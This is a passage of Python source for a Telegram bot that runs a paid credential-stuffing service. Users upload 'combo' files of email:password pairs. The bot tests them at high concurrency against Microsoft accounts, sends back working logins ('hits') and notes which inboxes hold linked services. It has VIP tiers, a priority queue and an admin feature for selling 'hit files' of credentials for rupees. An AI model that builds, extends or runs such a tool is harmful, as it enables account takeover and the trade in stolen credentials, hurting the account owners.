        await send(tid, f"🎉 {b('Congratulations!')}\n\nAdmin granted you {b(f'{label} VIP')}!\n\nEnjoy all VIP features!", reply_markup=main_menu(tid))
        return

    if state["action"] == "admin_add_points":
        parts = (msg.text.strip() if msg.text else "").split(" ")
        if not parts or len(parts) < 2: await send(chat_id, f"❌ Format: {code('ChatID Amount')} (e.g. {code('123456789 50')})"); return
        try:
            tid = int(parts[0])
            amount = int(parts[1])
        except ValueError:
            await send(chat_id, "❌ Invalid. Amount must be a positive number."); return
        
        if amount <= 0: await send(chat_id, "❌ Invalid. Amount must be a positive number."); return
        tu = get_user(tid)
        if not tu: await send(chat_id, f"❌ User {code(tid)} not found."); del user_state[chat_id]; return
        cursor.execute("UPDATE users SET referral_points = referral_points + ? WHERE chat_id=?", (amount, tid))
        conn.commit()
        new_total = (tu.get("referral_points", 0) or 0) + amount
        del user_state[chat_id]
        un = f"@{esc(tu['username'])}" if tu["username"] else esc(tu["first_name"])
        await send(chat_id,
            f"✅ {b('Points Added!')}\n\nUser: {b(un)} [{code(tid)}]\n➕ Added: {b(str(amount))} points\n📊 New Balance: {b(str(new_total))} points",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]])
        )
        try:
            await send(tid, f"🎁 {b('Points Added!')}\n\nAn admin has added {b(f'{amount} points')} to your account!\n\n📊 Your new balance: {b(f'{new_total} points')}", reply_markup=main_menu(tid))
        except Exception as e:
            logger.error(f"Error sending points notification to {tid}: {e}")
        return
    
    if state["action"] == "admin_broadcast_msg":
        target = state["data"]["target"]
        text = (msg.caption or msg.text or "").strip()
        photo_id = msg.photo[-1].file_id if msg.photo else None
        if not text and not photo_id: await send(chat_id, "❌ Please send a text message or a photo with caption."); return
        user_state[chat_id] = {"action": "admin_broadcast_preview", "data": {"target": target, "text": text, "photoId": photo_id}}
        target_label = "All Users" if target == "all" else ("VIP Users" if target == "vip" else "Free Users")
        preview_text = f"👁 {b('Preview')}\n\n📢 {b('Announcement')}\n\n{esc(text)}\n\n─────────────────\n🎯 Target: {b(target_label)}\n\nSend this broadcast?"
        confirm_btns = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Send Now", callback_data="bcast_confirm"), InlineKeyboardButton("❌ Cancel", callback_data="bcast_cancel")]])
        if photo_id:
            await application.bot.send_photo(chat_id, photo_id, caption=preview_text, parse_mode="HTML", reply_markup=confirm_btns)
        else:
            await send(chat_id, preview_text, reply_markup=confirm_btns)
        return

    # --- Ban: enter Chat ID ---
    if state["action"] == "admin_ban_user_id":
        raw = msg.text.strip() if msg.text else ""
        try:
            tid = int(raw)
        except ValueError:
            await send(chat_id, "❌ Enter a valid numeric Chat ID:"); return
        
        if is_admin(tid): await send(chat_id, "❌ Cannot ban another admin."); del user_state[chat_id]; return
        tu = get_user(tid)
        if not tu: await send(chat_id, f"❌ User {code(tid)} not found."); del user_state[chat_id]; return
        un = f"@{esc(tu['username'])}" if tu["username"] else esc(tu["first_name"])
        status_text = "🚫 Already banned" if tu["is_banned"] else "✅ Active"
        del user_state[chat_id]
        await send(chat_id,
            f"👤 {b(un)} [{code(tid)}]\nStatus: {status_text}\n\nConfirm ban?",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🚫 Yes, Ban", callback_data=f"do_ban_{tid}"), InlineKeyboardButton("❌ Cancel", callback_data="admin_panel")]])
        )
        return

    # --- Unban: enter Chat ID ---
    if state["action"] == "admin_unban_user_id":
        raw = msg.text.strip() if msg.text else ""
        try:
            tid = int(raw)
        except ValueError:
            await send(chat_id, "❌ Enter a valid numeric Chat ID:"); return
        
        tu = get_user(tid)
        if not tu: await send(chat_id, f"❌ User {code(tid)} not found."); del user_state[chat_id]; return
        un = f"@{esc(tu['username'])}" if tu["username"] else esc(tu["first_name"])
        if not tu["is_banned"]: await send(chat_id, f"ℹ️ User {b(un)} [{code(tid)}] is not banned.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]])
        ); del user_state[chat_id]; return
        del user_state[chat_id]
        await send(chat_id,
            f"👤 {b(un)} [{code(tid)}] is currently banned.\n\nConfirm unban?",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ Yes, Unban", callback_data=f"do_unban_{tid}"), InlineKeyboardButton("❌ Cancel", callback_data="admin_panel")]])
        )
        return

    # --- Revoke VIP: enter Chat ID ---
    if state["action"] == "admin_revoke_vip_id":
        raw = msg.text.strip() if msg.text else ""
        try:
            tid = int(raw)
        except ValueError:
            await send(chat_id, "❌ Enter a valid numeric Chat ID:"); return
        
        tu = get_user(tid)
        if not tu: await send(chat_id, f"❌ User {code(tid)} not found."); del user_state[chat_id]; return
        if not is_vip(tu): await send(chat_id, f"ℹ️ User {code(tid)} does not have VIP.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]])
        ); del user_state[chat_id]; return
        cursor.execute("UPDATE users SET is_vip=0, vip_expires_at=0 WHERE chat_id=?", (tid,))
        conn.commit()
        del user_state[chat_id]
        un = f"@{esc(tu['username'])}" if tu["username"] else esc(tu["first_name"])
        await send(tid, f"ℹ️ Your {b('VIP access has been revoked')} by an admin.\n\nContact support if you believe this is a mistake: {b(SUPPORT)}")
        await send(chat_id, f"✅ VIP revoked from {b(un)} [{code(tid)}].", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]])
        )
        return

    # --- Search User: enter ID or @username ---
    if state["action"] == "admin_search_user_query":
        query_str = msg.text.strip() if msg.text else ""
        del user_state[chat_id]
        tu = None
        if query_str.isdigit():
            tu = get_user(int(query_str))
        else:
            uname = query_str.replace("@", "")
            tu = cursor.execute("SELECT * FROM users WHERE username=?", (uname,)).fetchone()
            if tu: tu = dict(tu)
        
        if not tu: await send(chat_id, f"❌ No user found for {code(query_str)}.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]])
        ); return
        
        un = f"@{esc(tu['username'])}" if tu["username"] else esc(tu["first_name"])
        vip_status = f"💎 VIP ({esc(format_expiry(tu))})" if is_vip(tu) else "👤 Free"
        ban_status = "🚫 Banned" if tu["is_banned"] else "✅ Active"
        
        await send(chat_id,
            f"🔍 {b('User Found')}\n\n"
            f"👤 Name: {b(un)}\n🆔 Chat ID: {code(tu['chat_id'])}\n"
            f"Status: {vip_status}\n🔒 Ban: {ban_status}\n\n"
            f"📊 Stats:\n✅ Hits: {tu.get('hits', 0)} | ❌ Bad: {tu.get('bad', 0)}\n📋 Checked: {tu.get('total_checked', 0)}\n"
            f"🔗 Points: {tu.get('referral_points', 0)} | 🆓 Free Checks: {tu.get('free_checks', 0)}\n"
            f"📅 Joined: {datetime.fromtimestamp(tu['joined_at'] / 1000).strftime('%Y-%m-%d') if tu['joined_at'] else 'Unknown'}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💎 Grant VIP", callback_data="admin_grant_vip"), InlineKeyboardButton("❌ Revoke VIP", callback_data="admin_revoke_vip")],
                [InlineKeyboardButton("✅ Unban" if tu["is_banned"] else "🚫 Ban", callback_data=f"do_unban_{tu['chat_id']}" if tu["is_banned"] else f"do_ban_{tu['chat_id']}")],
                [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")],
            ])
        )
        return

async def photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    msg = update.effective_message
    chat_id = msg.chat.id
    state = user_state.get(chat_id)
    if not is_admin(chat_id) or not state or state["action"] != "admin_set_qr": return
    
    photo = msg.photo[-1] # Get the largest photo
    set_setting("qr_file_id", photo.file_id)
    del user_state[chat_id]
    await send(chat_id, f"✅ {b('QR Image saved!')}\n\nThis QR will now be shown to all users in the payment flow.",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]])
    )

# --- Queue runner ---
sweep_running = False
global_active_checks = 0
MAX_GLOBAL_CHECKS = 500

check_queue: List[QueueJob] = []
active_checkers: Set[int] = set()
stopped_checkers: Set[int] = set()
MAX_CONCURRENT_CHECKERS = 3

async def run_check_job(job: QueueJob):
    chat_id = job.chatId
    lines = job.lines
    threads = job.threads
    active_services = job.activeServices
    speed = job.speed

    active_checkers.add(chat_id)
    try:
        total = len(lines)
        hit_count = 0
        bad_count = 0
        retry_count = 0
        processed = 0
        no_service_hits: List[CheckResult] = []
        retry_lines: List[str] = []
        checked_accounts: Set[str] = set()

        status_msg = await application.bot.send_message(chat_id=chat_id,
            text=f"⚙️ {b('Checking...')}\n{progress_bar(0, total)}\n0/{total} | ✅ 0 | ❌ 0 | 🔄 0",
            parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Stop Scan", callback_data="stop_scan")]])
        )
        status_msg_id = status_msg.message_id

        last_update = time.time()
        async def update_status(label: str = "Checking..."):
            nonlocal last_update
            if time.time() - last_update < 3: # 3 seconds throttle
                return
            last_update = time.time()
            stopped = chat_id in stopped_checkers
            try:
                await application.bot.edit_message_text(
                    chat_id=chat_id, message_id=status_msg_id,
                    text=f"{'🛑' if stopped else '⚙️'} {b('Stopping...' if stopped else label)}\n{progress_bar(processed, total)}\n{processed}/{total} | ✅ {hit_count} | ❌ {bad_count} | 🔄 {retry_count}",
                    parse_mode="HTML",
                    reply_markup=None if stopped else InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Stop Scan", callback_data="stop_scan")]])
                )
            except telegram.error.TelegramError as e:
                if "message is not modified" not in str(e):
                    logger.error(f"Error updating status message for {chat_id}: {e}")

        async def process_single_line(line: str, is_retry: bool = False):
            nonlocal processed, hit_count, bad_count, retry_count
            global global_active_checks
            if chat_id in stopped_checkers: return
            
            try:
                ci = line.find(":")
                if ci < 1:
                    if not is_retry: processed += 1; bad_count += 1
                    return
                email = line[:ci].strip()
                password = line[ci+1:].strip()
                if not email or not password:
                    if not is_retry: processed += 1; bad_count += 1
                    return
                
                account_id = f"{email}:{password}"
                if account_id in checked_accounts:
                    if not is_retry: processed += 1; bad_count += 1
                    return
                checked_accounts.add(account_id)
                
                await asyncio.sleep(0.005) # Small delay to simulate network latency / non-blocking I/O
                
                while global_active_checks >= MAX_GLOBAL_CHECKS:
                    await asyncio.sleep(0.5)
                
                global_active_checks += 1
                result = CheckResult(status="RETRY")
                try:
                    result = await check_microsoft(email, password, active_services, chat_id)
                finally:
                    global_active_checks -= 1
                
                if not is_retry: processed += 1

                if result.status == "HIT":
                    hit_count += 1
                    try:
                        cursor.execute("UPDATE users SET hits=hits+1, total_checked=total_checked+1 WHERE chat_id=?", (chat_id,))
                        conn.commit()
                    except Exception as db_err:
                        logger.error(f"[BOT] DB write error for {chat_id}: {db_err}")
                    
                    if result.hasServices:
                        await send(chat_id, format_hit(result, hit_count))
                    else:
                        no_service_hits.append(result)
                elif result.status == "BAD":
                    bad_count += 1
                    try: cursor.execute("UPDATE users SET bad=bad+1, total_checked=total_checked+1 WHERE chat_id=?", (chat_id,)); conn.commit()
                    except Exception as db_err: logger.error(f"[BOT] DB write error (bad) for {chat_id}: {db_err}")
                else: # RETRY
                    if not is_retry: retry_lines.append(line)
                    retry_count += 1
                    try: cursor.execute("UPDATE users SET retries=retries+1, total_checked=total_checked+1 WHERE chat_id=?", (chat_id,)); conn.commit()
                    except Exception as db_err: logger.error(f"[BOT] DB write error (retry) for {chat_id}: {db_err}")
                
                await update_status()
            except Exception as err:
                logger.error(f"[BOT] process_single_line crash for {chat_id}: {err}")
                if not is_retry:
                    processed += 1
                    retry_count += 1
                    retry_lines.append(line)

        tasks = []
        for i in range(0, len(lines), threads):
            if chat_id in stopped_checkers: break
            batch = lines[i:i+threads]
            tasks.extend([process_single_line(l) for l in batch])
            if len(tasks) >= threads * 2: # Limit concurrent tasks to avoid overwhelming
                await asyncio.gather(*tasks)
                tasks = []
        if tasks:
            await asyncio.gather(*tasks)

        if retry_lines and chat_id not in stopped_checkers:
            retry_count = 0 # Reset retry count for the second pass
            try:
                await application.bot.edit_message_text(
                    chat_id=chat_id, message_id=status_msg_id,
                    text=f"🔄 {b('Retry pass...')} ({len(retry_lines)} accounts)\n{progress_bar(processed, total)}\n{processed}/{total} | ✅ {hit_count} | ❌ {bad_count}",
                    parse_mode="HTML"
                )
            except telegram.error.TelegramError as e:
                logger.error(f"Error updating status message for retry pass {chat_id}: {e}")

            retry_threads = min(threads, 50)
            tasks = []
            for i in range(0, len(retry_lines), retry_threads):
                if chat_id in stopped_checkers: break
                batch = retry_lines[i:i+retry_threads]
                tasks.extend([process_single_line(l, is_retry=True) for l in batch])
                if len(tasks) >= retry_threads * 2:
                    await asyncio.gather(*tasks)
                    tasks = []
            if tasks:
                await asyncio.gather(*tasks)

        was_stopped = chat_id in stopped_checkers
        try:
            await application.bot.edit_message_text(
                chat_id=chat_id, message_id=status_msg_id,
                text=(
                    f"🛑 {b('Scan Stopped!')}\n{progress_bar(processed, total)}\n📋 Checked: {processed}/{total} | ✅ Hits: {hit_count} | ❌ Bad: {bad_count} | 🔄 Retries: {retry_count}"
                    if was_stopped else
                    f"✅ {b('Check Complete!')}\n{progress_bar(total, total)}\n📋 Total: {total} | ✅ Hits: {hit_count} | ❌ Bad: {bad_count} | 🔄 Retries: {retry_count}"
                ),
                parse_mode="HTML"
            )
        except telegram.error.TelegramError as e:
            logger.error(f"Error updating final status message for {chat_id}: {e}")

        if no_service_hits:
            no_svc_lines = "\n".join([f"{h.email}:{h.password}" for h in no_service_hits])
            buf = bytes(no_svc_lines, "utf-8")
            try:
                await application.bot.send_document(chat_id=chat_id, document=buf,
                    caption=f"📄 {b(f'{len(no_service_hits)} Hit(s) — No Services in Inbox')}\n\nFormat: email:password",
                    parse_mode="HTML", filename="hits_no_services.txt", disable_notification=True
                )
            except telegram.error.TelegramError as e:
                logger.error(f"[BOT] send_document error for {chat_id}: {e}")

        finish_label = "🛑 Scan Stopped" if was_stopped else "🏁 Finished!"
        with_svc = hit_count - len(no_service_hits)
        await send(chat_id,
            f"{finish_label}\n\n"
            f"📋 Checked: {processed}{f'/{total}' if was_stopped else ''}\n"
            f"✅ Hits: {hit_count} (📨 {max(0, with_svc)} with services | 📄 {len(no_service_hits)} no services)\n"
            f"❌ Bad: {bad_count}\n🔄 Retries: {retry_count}\n\n<i>View all hits in My Hits.</i>",
            reply_markup=main_menu(chat_id)
        )
    except Exception as e:
        logger.error(f"[BOT] Check error for {chat_id}: {e}")
        await send(chat_id, "❌ Error processing file. Try again.", reply_markup=main_menu(chat_id))
    finally:
        active_checkers.discard(chat_id)
        stopped_checkers.discard(chat_id)
        process_next_queue()

def process_next_queue():
    if not check_queue: return
    if len(active_checkers) >= MAX_CONCURRENT_CHECKERS: return
    
    vip_idx = -1
    for i, job in enumerate(check_queue):
        if job.isVip:
            vip_idx = i
            break
    
    idx = vip_idx if vip_idx >= 0 else 0
    
    if not check_queue: return # Check again after finding index
    next_job = check_queue.pop(idx)
    
    wait_secs = round((time.time() * 1000 - next_job.addedAt) / 1000)
    vip_badge = "💎 " if next_job.isVip else ""
    asyncio.create_task(send(next_job.chatId,
        f"🚀 {b('Your check is starting now!')}\n\n{vip_badge}📋 {b(next_job.totalLines)} combos | ⚡ {esc(next_job.speed)} speed\n⏱ Waited: {wait_secs}s in queue"
    ))
    asyncio.create_task(run_check_job(next_job))

async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    msg = update.effective_message
    chat_id = msg.chat.id
    try: ensure_user(msg)
    except Exception as e: logger.error(f"Error ensuring user in document handler: {e}")

    state = user_state.get(chat_id)
    doc = msg.document

    # If no state but user sends a .txt file, auto-treat as combo check (state was lost on restart)
    if not state and doc and doc.file_name and doc.file_name.endswith(".txt"):
        state = {"action": "awaiting_combo_file"}
        user_state[chat_id] = state # Restore state for this session
    
    if not state: return

    user = get_user(chat_id)
    vip = is_vip(user)
    fc = user.get("free_checks", 0) if user else 0

    # Admin: upload hit file
    if state["action"] == "admin_hit_file_upload" and is_admin(chat_id):
        if not doc or not doc.file_name or not doc.file_name.endswith(".txt"):
            await send(chat_id, "❌ Please send a .txt file."); return
        
        try:
            file_obj = await application.bot.get_file(doc.file_id)
            link = file_obj.file_path
            async with httpx.AsyncClient() as client:
                resp = await client.get(link, timeout=30.0)
                resp.raise_for_status()
                content = resp.text
            
            name = state["data"]["name"]
            price = state["data"]["price"]
            quantity = state["data"]["quantity"]
            cursor.execute("INSERT INTO hit_files (name,price,quantity,content,created_at) VALUES (?,?,?,?,?)", (name, price, quantity, content, int(time.time() * 1000)))
            conn.commit()
            del user_state[chat_id]
            lines = len([l for l in content.split("\n") if ":" in l])
            await send(chat_id, f"✅ {b('Hit File Uploaded!')}\n\n{b(name)} — ₹{price}\nQty: {'∞' if quantity == -1 else quantity}\nLines: {lines}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]])
            )
        except Exception as e:
            logger.error(f"Failed to download/process admin hit file for {chat_id}: {e}")
            await send(chat_id, "❌ Failed to download file or process content.")
        return

    # User: combo checker
    if state["action"] == "awaiting_combo_file":
        if not doc or not doc.file_name or not doc.file_name.endswith(".txt"):
            await send(chat_id, "❌ Please send a .txt file."); return
        
        file_size = doc.file_size or 0

        if not vip and fc == 0 and file_size > 5 * 1024 * 1024:
            await send(chat_id,
                f"❌ {b('File too large!')}\n{file_size / 1024 / 1024:.2f}MB\n\nFree users: max 5MB (or use a Free Check).\n\n💎 Upgrade to VIP for unlimited!",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("💎 Buy VIP", callback_data="buy_vip")],
                    [InlineKeyboardButton("🎁 Redeem Check", callback_data="redeem_check")],
                    [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
                ])
            )
            del user_state[chat_id]
            return
        
        del user_state[chat_id]

        used_free_check = False
        if not vip and fc > 0:
            cursor.execute("UPDATE users SET free_checks=free_checks-1 WHERE chat_id=?", (chat_id,))
            conn.commit()
            used_free_check = True
        
        speed = user.get("speed", "medium") if user else "medium"
        threads = {
            "slow": 30, "medium": 80, "fast": 150, "superfast": 250, "ultra": 400
        }.get(speed, 80)
        
        new_fc = (user.get("free_checks", 0) if user else 0) - (1 if used_free_check else 0)
        active_services = get_user_services(user)
        active_svc_count = len(active_services)

        used_free_msg = f'\n🆓 {b("Used 1 free check!")} ({max(0, new_fc)} remaining)' if used_free_check else ''
        await send(chat_id,
            f"🔄 {b('File Received!')}\n\nSize: {file_size / 1024:.1f}KB\n⚡ Speed: {esc(speed)} ({threads} threads)\n🔍 Services: {active_svc_count} active"
            f"{used_free_msg}"
            f"\n\n⚙️ Downloading..."
        )

        try:
            file_obj = await application.bot.get_file(doc.file_id)
            link = file_obj.file_path
            async with httpx.AsyncClient() as client:
                resp = await client.get(link, timeout=60.0)
                resp.raise_for_status()
                content = resp.text
            
            raw_lines = content.replace("\ufeff", "").splitlines() # Remove BOM, split by any newline
            lines = [
                l.strip() for l in raw_lines
                if l.strip() and not l.strip().startswith("#") and ":" in l.strip() and l.strip().split(":", 1)[1].strip()
            ]

            if not lines:
                await send(chat_id, "❌ No valid combos found (format: email:password).", reply_markup=main_menu(chat_id))
                return
            
            job = QueueJob(chatId=chat_id, lines=lines, threads=threads, activeServices=active_services,
                           addedAt=int(time.time() * 1000), fileSize=file_size, speed=speed,
                           totalLines=len(lines), isVip=vip)

            if chat_id in active_checkers:
                await send(chat_id,
                    f"⚠️ {b('You already have a check running!')}\n\nPlease wait for it to finish before starting a new one.",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 View Queue", callback_data="queue_status")], [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]])
                )
                return
            
            if any(j.chatId == chat_id for j in check_queue):
                await send(chat_id,
                    f"⚠️ {b('You are already in the queue!')}\n\nWait for your current job to start before adding another.",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 View Queue", callback_data="queue_status")], [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]])
                )
                return

            if len(active_checkers) < MAX_CONCURRENT_CHECKERS:
                await send(chat_id, f"📋 {b(f'Found {len(lines)} combos')}. Starting immediately...")
                asyncio.create_task(run_check_job(job))
            else:
                if vip:
                    first_free_idx = -1
                    for i, q_job in enumerate(check_queue):
                        if not q_job.isVip:
                            first_free_idx = i
                            break
                    if first_free_idx >= 0:
                        check_queue.insert(first_free_idx, job)
                    else:
                        check_queue.append(job)
                else:
                    check_queue.append(job)
                
                my_pos = -1
                for i, q_job in enumerate(check_queue):
                    if q_job.chatId == chat_id:
                        my_pos = i
                        break
                
                est_minutes = (my_pos + 1) * 3
                vip_note = f"\n💎 {b('VIP Priority — you skip free users!')}" if vip else ""
                await send(chat_id,
                    f"📋 {b('Added to Queue!')}\n\n"
                    f"📍 Your position: {b(f'#{my_pos + 1}')}{vip_note}\n"
                    f"📋 Combos: {b(len(lines))}\n"
                    f"⚡ Speed: {b(speed)}\n"
                    f"⏱ Est. wait: ~{b(f'{est_minutes} min')}\n\n"
                    f"<i>You'll be notified when your check starts. Tap Queue to track your position.</i>",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 View Queue", callback_data="queue_status")], [InlineKeyboardButton("❌ Leave Queue", callback_data="queue_leave")]])
                )
        except Exception as e:
            logger.error(f"[BOT] File processing error for {chat_id}: {e}")
            await send(chat_id, "❌ Error processing file. Try again.", reply_markup=main_menu(chat_id))
        return

# --- Leaderboard VIP logic ---
async def update_leaderboard_vip():
    try:
        top_user = cursor.execute(
            "SELECT * FROM users WHERE referral_points > 0 ORDER BY referral_points DESC LIMIT 1"
        ).fetchone()
        if top_user: top_user = dict(top_user)

        prev_top_id = get_setting("leaderboard_top_id")
        new_top_id = str(top_user["chat_id"]) if top_user else None

        if prev_top_id == new_top_id: return

        # Revoke leaderboard VIP from previous #1
        if prev_top_id:
            prev_user = get_user(int(prev_top_id))
            if prev_user and prev_user.get("vip_source") == "leaderboard":
                cursor.execute("UPDATE users SET is_vip=0, vip_expires_at=0, vip_source='none' WHERE chat_id=?", (prev_user["chat_id"],))
                conn.commit()
                un = f"@{prev_user['username']}" if prev_user["username"] else prev_user["first_name"]
                await send(prev_user["chat_id"],
                    f"🏆 {b('Leaderboard Update')}\n\nYou are no longer #1 on the referral leaderboard.\n\n💎 Your leaderboard VIP has been removed.\n\n<i>Keep referring to reclaim the top spot!</i>"
                )
                logger.info(f"[LEADERBOARD] VIP removed from {un} ({prev_user['chat_id']})")

        # Grant leaderboard VIP to new #1
        if top_user:
            cursor.execute("UPDATE users SET is_vip=1, vip_expires_at=-2, vip_source='leaderboard' WHERE chat_id=?", (top_user["chat_id"],))
            conn.commit()
            set_setting("leaderboard_top_id", str(top_user["chat_id"]))
            un = f"@{top_user['username']}" if top_user["username"] else top_user["first_name"]
            lb_title = b("You're #1 on the Leaderboard!")
            await send(top_user["chat_id"],
                f"🏆 {lb_title}\n\n"
                f"💎 {b('VIP access granted')} for as long as you hold the top spot!\n\n"
                f"🔗 Your referral points: {b(top_user['referral_points'])}\n\n"
                f"<i>Keep sharing your referral link to stay on top!</i>",
                reply_markup=main_menu(top_user["chat_id"])
            )
            logger.info(f"[LEADERBOARD] VIP granted to {un} ({top_user['chat_id']}) with {top_user['referral_points']} pts")
        else:
            set_setting("leaderboard_top_id", "")
    except Exception as e:
        logger.error(f"[LEADERBOARD] update_leaderboard_vip error: {e}")

# Re-check leaderboard every 15 minutes
async def leaderboard_vip_scheduler():
    while True:
        await update_leaderboard_vip()
        await asyncio.sleep(15 * 60)

# --- Channel membership sweep ---
async def run_channel_membership_sweep(triggered_by: Optional[int] = None) -> str:
    global sweep_running
    if sweep_running: return "⚠️ A sweep is already running. Please wait."
    channels = get_channels()
    checkable_channels = [c for c in channels if c.id]
    if not checkable_channels: return "ℹ️ No checkable channels configured (public channels with @username needed)."

    sweep_running = True
    notified = 0
    removed = 0
    checked = 0
    try:
        users = cursor.execute(
            "SELECT chat_id FROM users WHERE is_banned=0 ORDER BY last_channel_check ASC"
        ).fetchall()

        for user_row in users:
            chat_id = user_row["chat_id"]
            if chat_id in get_admin_ids(): continue
            checked += 1
            cursor.execute("UPDATE users SET last_channel_check=? WHERE chat_id=?", (int(time.time() * 1000), chat_id))
            conn.commit()

            check_result = await is_member_of_all_channels(chat_id)
            if not check_result["ok"]:
                removed += 1
                missing_btns = [[InlineKeyboardButton(f"📢 Join {ch.label}", url=ch.link)] for ch in check_result["missing"]]
                missing_btns.append([InlineKeyboardButton("✅ I've Joined All", callback_data="check_membership")])
                try:
                    missing_labels = '\n'.join(f'• {ch.label}' for ch in check_result['missing'])
                    await application.bot.send_message(chat_id=chat_id,
                        text=f"⚠️ <b>Action Required</b>\n\nYou have left {len(check_result['missing']) == 1 and 'a required channel' or 'required channels'}:\n"
                        f"{missing_labels}"
                        f"\n\n<i>Please rejoin to continue using the bot.</i>",
                        parse_mode="HTML", reply_markup=InlineKeyboardMarkup(missing_btns)
                    )
                    notified += 1
                except telegram.error.TelegramError as e:
                    logger.error(f"Error notifying user {chat_id} about missing channels: {e}")
            await asyncio.sleep(0.3) # Throttle
    finally:
        sweep_running = False
    
    summary = f"✅ Sweep complete.\n\n👥 Checked: {checked}\n🚪 Left channels: {removed}\n📨 Notified: {notified}"
    if triggered_by:
        await send(triggered_by, summary, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📌 Channels", callback_data="admin_channels")]]))
    return summary

# Auto-sweep every 6 hours
async def channel_sweep_scheduler():
    while True:
        await run_channel_membership_sweep()
        await asyncio.sleep(6 * 60 * 60)

# --- FastAPI App ---
app = FastAPI()

# Middleware for logging (Pino-http equivalent)
@app.middleware("http")
async def log_requests(request: Request, call_next):
    start_time_req = time.time()
    response = await call_next(request)
    process_time = time.time() - start_time_req
    
    log_entry = {
        "req": {
            "id": request.headers.get("x-request-id", str(uuid.uuid4())),
            "method": request.method,
            "url": request.url.path,
        },
        "res": {
            "statusCode": response.status_code,
        },
        "responseTime": f"{process_time:.3f}ms"
    }
    logger.info(json.dumps(log_entry))
    return response

# Root endpoint
@app.get("/")
async def root_status(response: Response):
    response.headers["Cache-Control"] = "no-store"
    return {
        "status": "ok",
        "service": "telegram-bot",
        "uptimeSeconds": int(time.monotonic() - start_time),
        "botConfigured": is_bot_configured,
    }

@app.head("/")
async def root_status_head(response: Response):
    response.headers["Cache-Control"] = "no-store"
    return Response(status_code=status.HTTP_200_OK, headers={"Cache-Control": "no-store"})

# Health check endpoint
@app.get("/healthz")
async def health_check(response: Response):
    response.headers["Cache-Control"] = "no-store"
    return {
        "status": "ok",
        "service": "telegram-bot",
        "uptimeSeconds": int(time.monotonic() - start_time),
        "botConfigured": is_bot_configured,
    }

@app.head("/healthz")
async def health_check_head(response: Response):
    response.headers["Cache-Control"] = "no-store"
    return Response(status_code=status.HTTP_200_OK, headers={"Cache-Control": "no-store"})

@app.get("/ping")
async def ping_status(response: Response):
    response.headers["Cache-Control"] = "no-store"
    return {
        "status": "pong",
        "service": "telegram-bot",
        "uptimeSeconds": int(time.monotonic() - start_time),
        "botConfigured": is_bot_configured,
    }

@app.head("/ping")
async def ping_status_head(response: Response):
    response.headers["Cache-Control"] = "no-store"
    return Response(status_code=status.HTTP_200_OK, headers={"Cache-Control": "no-store"})

# Bot webhook endpoint
@app.post("/api/bot-webhook")
async def bot_webhook(request: Request):
    if not is_bot_configured:
        raise HTTPException(status_code=status.HTTP_503_SERVICE_UNAVAILABLE, detail="Bot token is not configured")
    
    try:
        update_json = await request.json()
        update = Update.de_json(update_json, application.bot)
        await application.update_queue.put(update) # Process update via application
    except Exception as e:
        logger.error(f"[WEBHOOK] processUpdate error: {e}")
    return Response(status_code=status.HTTP_200_OK)

# --- Startup and Shutdown Events ---
async def start_bot_async(webhook_url: Optional[str] = None):
    global application
    if not is_bot_configured:
        logger.warning("[BOT] TELEGRAM_BOT_TOKEN is not set. Health server is running, but the bot is disabled.")
        return

    application = Application.builder().token(TOKEN).build()

    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("admin", admin_command))
    application.add_handler(CommandHandler("addadmin", addadmin_command))
    application.add_handler(CommandHandler("removeadmin", removeadmin_command))
    application.add_handler(CommandHandler("listadmins", listadmins_command))
    application.add_handler(CommandHandler("export", export_command))
    application.add_handler(CommandHandler("id", id_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("ping", ping_command))
    application.add_handler(CommandHandler("cancel", cancel_command))
    application.add_handler(CallbackQueryHandler(callback_query_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    application.add_handler(MessageHandler(filters.Document.ALL, document_handler))
    application.add_handler(MessageHandler(filters.PHOTO, photo_handler))
    application.add_error_handler(error_handler)

    await application.initialize()

    if webhook_url:
        await application.bot.delete_webhook()
        await application.bot.set_webhook(url=webhook_url, max_connections=40)
        logger.info(f"[BOT] Webhook set → {webhook_url}")
        await application.start()
    elif DEV_POLLING:
        logger.info("[BOT] Polling started (dev).")
        await application.start()
        await application.updater.start_polling(drop_pending_updates=True)
    else:
        logger.info("[BOT] No polling/webhook — set DEV_BOT_ENABLED=true to enable dev polling.")
    
    # Start background tasks
    asyncio.create_task(leaderboard_vip_scheduler())
    asyncio.create_task(channel_sweep_scheduler())

@app.on_event("startup")
async def startup_event():
    logger.info("FastAPI app startup.")
    
    # Start bot: webhook in production, polling in dev
    is_replit_deployment = os.environ.get("REPLIT_DEPLOYMENT") == "1"
    if is_replit_deployment:
        domain = os.environ.get("REPLIT_DOMAINS")
        if domain:
